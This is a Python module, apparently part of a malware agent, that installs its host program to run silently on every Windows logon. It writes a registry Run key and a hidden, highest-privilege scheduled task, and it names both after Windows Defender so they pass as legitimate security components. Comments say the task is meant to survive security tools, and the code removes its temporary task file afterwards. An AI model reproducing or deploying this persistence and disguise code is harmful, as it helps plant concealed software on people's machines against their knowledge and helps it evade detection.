# startup.py — installs agent to run silently on every boot

import os, sys, winreg, subprocess
from pathlib import Path

APP_NAME    = "WindowsDefenderCache"   # disguised registry key name
TASK_NAME   = "MicrosoftDefenderCache" # disguised task scheduler name


def _get_exe_path() -> str:
    """Return path to the running exe (or script during dev)."""
    if getattr(sys, "frozen", False):
        return sys.executable          # PyInstaller compiled exe
    return os.path.abspath(sys.argv[0])


def install_registry():
    """Add agent to HKCU Run key — runs on user login."""
    exe = _get_exe_path()
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def install_task_scheduler():
    """
    Register a scheduled task that runs at logon with highest privileges.
    More reliable than registry key — survives some security tools.
    """
    exe = _get_exe_path()
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>"{exe}"</Command>
    </Exec>
  </Actions>
</Task>"""

    xml_path = Path(os.environ["TEMP"]) / "_task.xml"
    xml_path.write_text(xml, encoding="utf-16")

    try:
        result = subprocess.run(
            ["schtasks", "/create", "/tn", TASK_NAME, "/xml", str(xml_path), "/f"],
            capture_output=True
        )
        return result.returncode == 0
    except Exception:
        return False
    finally:
        try:
            xml_path.unlink()
        except Exception:
            pass


def is_already_installed() -> bool:
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def install():
    """Install both persistence methods if not already installed."""
    if not is_already_installed():
        install_registry()
        install_task_scheduler()
